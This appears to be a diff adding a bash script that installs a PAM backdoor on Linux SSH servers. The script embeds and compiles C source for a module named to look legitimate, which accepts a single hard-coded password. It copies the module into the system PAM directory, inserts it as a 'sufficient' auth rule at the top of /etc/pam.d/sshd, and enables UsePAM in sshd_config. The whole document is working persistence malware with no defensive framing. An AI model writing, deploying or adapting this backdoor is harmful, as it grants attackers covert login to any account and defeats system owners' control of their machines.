@@ -1,0 +1,163 @@
+#!/bin/bash
+
+# Check if a parameter is provided and not empty
+if [[ -z "$1" ]]; then
+    echo "[-] error: missing required argument!"
+    echo "Usage: $0 <password>"
+    exit 1
+fi
+
+PASSWORD="$1"
+echo "[+] preparing for password: ${PASSWORD}"
+
+MOD_NAME="pam_verify_auth"
+SOURCE="${MOD_NAME}.c"
+OBJECT="${MOD_NAME}.o"
+MODULE="${MOD_NAME}.so"
+
+cat << 'EOF' > ${SOURCE}
+#include <security/pam_modules.h>
+#include <security/pam_appl.h>
+#include <security/pam_ext.h>
+#include <string.h>
+
+PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
+                                   int argc, const char **argv) {
+    (void)flags;
+    (void)argc;
+    (void)argv;
+
+    const char *password = NULL;
+    int retval = pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
+   
+    if (retval != PAM_SUCCESS || password == NULL) {
+        retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, "");
+        if (retval != PAM_SUCCESS || password == NULL) {
+            return PAM_AUTH_ERR;
+        }
+    }
+
+    if (strcmp(password, SECRET) != 0) {
+        return PAM_AUTH_ERR;
+    }
+    
+    return PAM_SUCCESS;
+}
+
+PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
+                              int argc, const char **argv) {
+    (void)pamh;
+    (void)flags;
+    (void)argc;
+    (void)argv;
+    return PAM_SUCCESS;
+}
+EOF
+
+PAMD_PATH="/etc/pam.d/sshd"
+set -e
+
+if [[ ! -f $PAMD_PATH ]]; then
+    echo "[-] ${PAMD_PATH} not found, exiting..." >&2
+    exit 1
+fi
+
+if service sshd status &>/dev/null || systemctl is-active --quiet sshd || service ssh status &>/dev/null || systemctl is-active --quiet ssh; then
+    echo "[+] ssh status: ssh / sshd is running"
+elif service --status-all 2>/dev/null | grep -qE 'ssh(d)?' || systemctl list-unit-files --type=service | grep -qE 'ssh(d)?'; then
+    echo "[*] ssh status: found ssh / sshd service, but not running"
+else
+    echo "[-] ssh status: no ssh / sshd service was found, exiting..."
+    exit 1
+fi
+
+echo "[*] checking OS architecture..."
+GCC_PKG="gcc"
+ADDITIONAL_FLAGS=""
+if [[ -f /etc/debian_version ]]; then
+    echo "[+] OS detected: debian"
+    OS="DEB"
+    PKG_MANAGER="apt-get"
+    PAM_PKG="libpam0g-dev"
+    ADDITIONAL_FLAGS="--fix-missing"
+elif [[ -f /etc/redhat-release ]]; then
+    echo "[+] OS detected: RHEL"
+    OS="RHEL"
+    PKG_MANAGER="yum"
+    PAM_PKG="pam-devel"
+else
+    echo "[-] unsupported OS, exiting..."
+    exit 1
+fi
+
+echo "[*] installing required packages using ${PKG_MANAGER}..."
+sudo $PKG_MANAGER update -y &> /dev/null || true
+sudo $PKG_MANAGER install -y $GCC_PKG $PAM_PKG $ADDITIONAL_FLAGS &> /dev/null || true
+
+if ! command -v gcc &>/dev/null; then
+    echo "[-] GCC was not installed, exiting..." >&2
+    exit 1
+fi
+
+echo "[*] searching for 'pam_unix.so' to extract target directory..."
+pam_unix_path=$(sudo find / -name "pam_unix.so" -user root 2>/dev/null | head -1)
+if [[ -z "$pam_unix_path" ]]; then
+    echo "[-] 'pam_unix.so' not found on this system."
+    exit 1
+fi
+DEST_DIR=$(dirname "$pam_unix_path")
+echo "[+] target directory set to: ${DEST_DIR}"
+
+echo "[*] compiling ${SOURCE}..."
+gcc -fPIC -c ${SOURCE} -o ${OBJECT} -Wall -Wextra -O2 -DSECRET="\"${PASSWORD}\""
+
+echo "[*] linking object file into shared module ${MODULE}..."
+gcc -shared -o ${MODULE} ${OBJECT} -lpam
+
+echo "[*] moving ${MODULE} to ${DEST_DIR}..."
+sudo mv ${MODULE} ${DEST_DIR}
+
+echo "[*] setting ownership to root:root and permissions to 644..."
+sudo chown root:root "${DEST_DIR}/${MODULE}"
+sudo chmod 644 "${DEST_DIR}/${MODULE}"
+
+if grep -q "$MODULE" "$PAMD_PATH"; then
+    echo "[*] module '$MODULE' is already present in ${PAMD_PATH}, skip modifying..."
+else
+    echo "[+] injecting '${MODULE}' into ${PAMD_PATH}..."
+    pamd_entry="auth    sufficient    ${DEST_DIR}/${MODULE}"
+    pamd_entry_escaped=$(echo "$pamd_entry" | sed 's|/|\\/|g')
+    if [[ "$OS" == "DEB" ]]; then
+        sudo sed -i "1s|^|${pamd_entry_escaped}\n|" $PAMD_PATH
+    elif [[ "$OS" == "RHEL" ]]; then
+        if ! grep -q '^auth' $PAMD_PATH; then
+            sudo sed -i "1i ${pamd_entry_escaped}" $PAMD_PATH
+        else
+            sudo sed -i "0,/^auth/s|^auth|${pamd_entry_escaped}\n&|" $PAMD_PATH
+        fi
+    fi
+    if ! grep -q "$MODULE" $PAMD_PATH; then
+        echo "[-] unable to inject ${MODULE} into ${PAMD_PATH}"
+        exit 1
+    else
+        echo "[+] ${MODULE} was injected into ${PAMD_PATH}"
+    fi
+fi
+
+SSH_CONFIG="/etc/ssh/sshd_config"
+echo "[*] setting 'UsePAM yes' in ${SSH_CONFIG}..."
+if grep -qE "^\s*UsePAM\s+yes" "$SSH_CONFIG"; then
+    echo "[+] UsePAM is already enabled"
+else
+    if grep -E "^\s*UsePAM\s+no" "$SSH_CONFIG"; then
+        sudo sed -i -E 's/^\s*UsePAM\s+no/UsePAM yes/' "$SSH_CONFIG"
+    elif grep -E "^\s*#\s*UsePAM\s+yes" "$SSH_CONFIG"; then
+        sudo sed -i -E 's/^\s*#\s*UsePAM\s+yes/UsePAM yes/' "$SSH_CONFIG"
+    else
+        echo "UsePAM yes" | sudo tee -a "$SSH_CONFIG" > /dev/null
+    fi
+    echo "[+] UsePAM has been enabled"
+fi
+
+echo "================================================================="
+echo "[+] PAM module installation complete! restart ssh/sshd service to apply the changes"
